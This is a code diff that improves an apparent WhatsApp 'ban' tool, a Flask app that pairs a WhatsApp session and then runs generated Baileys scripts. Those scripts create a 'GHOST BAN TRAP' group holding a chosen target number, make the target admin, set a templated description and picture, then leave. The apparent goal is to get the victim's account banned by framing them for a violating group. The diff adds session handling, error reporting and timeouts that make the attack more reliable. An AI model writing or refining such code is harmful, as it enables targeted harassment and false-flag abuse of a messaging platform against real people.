@@ -4,6 +4,7 @@ import time
 import re
 import threading
 import json
+import signal
 from flask import Flask, render_template_string, request
 
 app = Flask(__name__)
@@ -11,6 +12,7 @@ app = Flask(__name__)
 # Store active processes and connections
 active_processes = {}
 active_connections = {}
+session_lock = threading.Lock()
 
 # ========== ACCESS KEY ==========
 ACCESS_KEY = os.environ.get('ACCESS_KEY', 'GHOST-BAN-2026')
@@ -85,6 +87,7 @@ def run_pairing_process(number, session_id):
         return None, "pair.js not found"
     
     try:
+        # Kill any existing node processes for this number to prevent conflicts
         subprocess.run(['pkill', '-f', f'node.*{number}'], stderr=subprocess.DEVNULL)
         time.sleep(1)
         
@@ -106,7 +109,8 @@ def run_pairing_process(number, session_id):
             'number': number,
             'code': None,
             'logs': [],
-            'linked': False
+            'linked': False,
+            'session_path': './session_new'  # Track the session path
         }
         
         for line in iter(process.stdout.readline, ''):
@@ -128,8 +132,13 @@ def run_pairing_process(number, session_id):
             
             if "SUCCESS: DEVICE LINKED" in line or "DEVICE LINKED" in line:
                 active_processes[session_id]['linked'] = True
-                active_connections[number] = True
-                print(f"[{session_id}] Device linked!")
+                with session_lock:
+                    active_connections[number] = {
+                        'session_id': session_id,
+                        'session_path': './session_new',
+                        'linked_at': time.time()
+                    }
+                print(f"[{session_id}] Device linked! Connection stored.")
             
             if "Logged out" in line or "authentication failed" in line:
                 print(f"[{session_id}] Linking failed")
@@ -146,93 +155,150 @@ def run_pairing_process(number, session_id):
         print(f"[{session_id}] Error: {str(e)}")
     finally:
         if session_id in active_processes:
-            del active_processes[session_id]
+            # Don't delete from active_processes immediately so we can check status
+            pass
 
 # ========== BAN FUNCTION ==========
 def execute_ban(target_number):
     """Execute ban by creating trap group using Node.js"""
-    if not active_connections:
-        return False, "No WhatsApp connection. Pair first."
+    with session_lock:
+        if not active_connections:
+            return False, "No WhatsApp connection. Pair first."
+        
+        # Get the most recent active connection
+        connected_number = list(active_connections.keys())[0]
+        session_info = active_connections[connected_number]
+        session_path = session_info.get('session_path', './session_new')
     
-    connected_number = list(active_connections.keys())[0]
+    # Verify session exists and has credentials
+    if not os.path.exists(session_path):
+        return False, f"Session not found at {session_path}. Pair first."
     
-    # Create ban script
+    creds_file = os.path.join(session_path, 'creds.json')
+    if not os.path.exists(creds_file):
+        return False, "Session exists but no credentials found. Pair again."
+    
+    # Create ban script that reuses the EXISTING session
     ban_script = f'''
-const {{ default: makeWASocket, useMultiFileAuthState, delay }} = require("@whiskeysockets/baileys");
+const {{ default: makeWASocket, useMultiFileAuthState, delay, DisconnectReason }} = require("@whiskeysockets/baileys");
 const pino = require("pino");
 const fs = require("fs");
 
 async function ban() {{
-    const sessionPath = './session_new';
+    const sessionPath = "{session_path}";
+    
+    // Check if session exists
+    if (!fs.existsSync(sessionPath)) {{
+        console.log("ERROR: Session not found at " + sessionPath);
+        process.exit(1);
+    }}
+    
     const {{ state, saveCreds }} = await useMultiFileAuthState(sessionPath);
     
     const sock = makeWASocket({{
         auth: state,
         logger: pino({{ level: "silent" }}),
-        browser: ["Ubuntu", "Chrome", "20.0.04"]
+        browser: ["Ubuntu", "Chrome", "20.0.04"],
+        syncFullHistory: false,
+        markOnlineOnConnect: false,
+        printQRInTerminal: false,
+        connectTimeoutMs: 30000,
+        keepAliveIntervalMs: 30000,
+        defaultQueryTimeoutMs: 30000
     }});
     
     sock.ev.on("creds.update", saveCreds);
     
+    let connectionOpen = false;
+    
     sock.ev.on("connection.update", async (update) => {{
-        const {{ connection }} = update;
+        const {{ connection, lastDisconnect }} = update;
         
         if (connection === "open") {{
+            connectionOpen = true;
             console.log("[✓] Connected for ban");
             
-            const targetJid = "{target_number}" + "@s.whatsapp.net";
+            const targetJid = "{target_number}@s.whatsapp.net";
             const botJid = sock.user.id;
             
-            // Create group
-            const group = await sock.groupCreate("GHOST BAN TRAP", [botJid, targetJid]);
-            const groupJid = group.id;
-            console.log("[✓] Group created: " + groupJid);
+            try {{
+                // Create group
+                const group = await sock.groupCreate("GHOST BAN TRAP", [botJid, targetJid]);
+                const groupJid = group.id;
+                console.log("[✓] Group created: " + groupJid);
+                
+                await delay(2000);
+                
+                // Promote target
+                await sock.groupParticipantsUpdate(groupJid, [targetJid], "promote");
+                console.log("[✓] Target promoted");
+                
+                await delay(1500);
+                
+                // Demote bot
+                await sock.groupParticipantsUpdate(groupJid, [botJid], "demote");
+                console.log("[✓] Bot demoted");
+                
+                await delay(1500);
+                
+                // Update description
+                const desc = `{GROUP_DESCRIPTION.replace('{target}', target_number)}`;
+                await sock.groupUpdateDescription(groupJid, desc);
+                console.log("[✓] Description updated");
+                
+                await delay(1500);
+                
+                // Update profile picture if exists
+                if (fs.existsSync("ghost_ban_profile.jpg")) {{
+                    const pic = fs.readFileSync("ghost_ban_profile.jpg");
+                    await sock.updateProfilePicture(groupJid, pic);
+                    console.log("[✓] Profile picture updated");
+                }}
+                
+                await delay(1500);
+                
+                // Leave group
+                await sock.groupLeave(groupJid);
+                console.log("[✓] Bot left group");
+                console.log("BAN_COMPLETE");
+                
+                // Close connection gracefully
+                await delay(1000);
+                process.exit(0);
+            }} catch (err) {{
+                console.log("ERROR: " + err.message);
+                process.exit(1);
+            }}
+        }}
+        
+        if (connection === "close") {{
+            const statusCode = lastDisconnect?.error?.output?.statusCode;
+            console.log("Connection closed. Status: " + statusCode);
             
-            await delay(2000);
-            
-            // Promote target
-            await sock.groupParticipantsUpdate(groupJid, [targetJid], "promote");
-            console.log("[✓] Target promoted");
-            
-            await delay(1500);
-            
-            // Demote bot
-            await sock.groupParticipantsUpdate(groupJid, [botJid], "demote");
-            console.log("[✓] Bot demoted");
-            
-            await delay(1500);
-            
-            // Update description
-            const desc = `{GROUP_DESCRIPTION.replace('{target}', target_number)}`;
-            await sock.groupUpdateDescription(groupJid, desc);
-            console.log("[✓] Description updated");
-            
-            await delay(1500);
-            
-            // Update profile picture if exists
-            if (fs.existsSync("ghost_ban_profile.jpg")) {{
-    const sharp = require("sharp");
-    const picBuffer = await sharp("ghost_ban_profile.jpg")
-        .resize(640, 640, {{ fit: 'cover', position: 'center' }})
-        .jpeg({{ quality: 80 }})
-        .toBuffer();
-    await sock.updateProfilePicture(groupJid, picBuffer);
-    console.log("[✓] Profile picture updated");
-}}
-            
-            await delay(1500);
-            
-            // Leave group
-            await sock.groupLeave(groupJid);
-            console.log("[✓] Bot left group");
-            console.log("BAN_COMPLETE");
-            
-            process.exit(0);
+            if (!connectionOpen) {{
+                console.log("ERROR: Failed to connect - session may be in use or invalid");
+                process.exit(1);
+            }}
+        }}
+        
+        if (connection === "connecting") {{
+            console.log("[i] Connecting to WhatsApp for ban...");
         }}
     }});
+    
+    // Timeout safety net
+    setTimeout(() => {{
+        if (!connectionOpen) {{
+            console.log("ERROR: Connection timeout - could not connect to WhatsApp");
+            process.exit(1);
+        }}
+    }}, 30000);
 }}
 
-ban();
+ban().catch(err => {{
+    console.log("FATAL ERROR: " + err.message);
+    process.exit(1);
+}});
 '''
     
     with open('ban-temp.js', 'w') as f:
@@ -243,18 +309,23 @@ ban();
             ['node', 'ban-temp.js'],
             capture_output=True,
             text=True,
-            timeout=60
+            timeout=45  # Increased slightly
         )
         
         output = result.stdout + result.stderr
         
         if "BAN_COMPLETE" in output:
             return True, "Trap group created successfully"
+        elif "ERROR:" in output:
+            # Extract the actual error message
+            error_lines = [line for line in output.split('\n') if 'ERROR:' in line]
+            error_msg = error_lines[-1].replace('ERROR:', '').strip() if error_lines else output[-500:]
+            return False, f"Ban failed: {error_msg}"
         else:
             return False, f"Ban failed: {output[-500:]}"
             
     except subprocess.TimeoutExpired:
-        return False, "Ban timeout"
+        return False, "Ban timeout - WhatsApp connection failed or hung"
     except Exception as e:
         return False, str(e)
     finally:
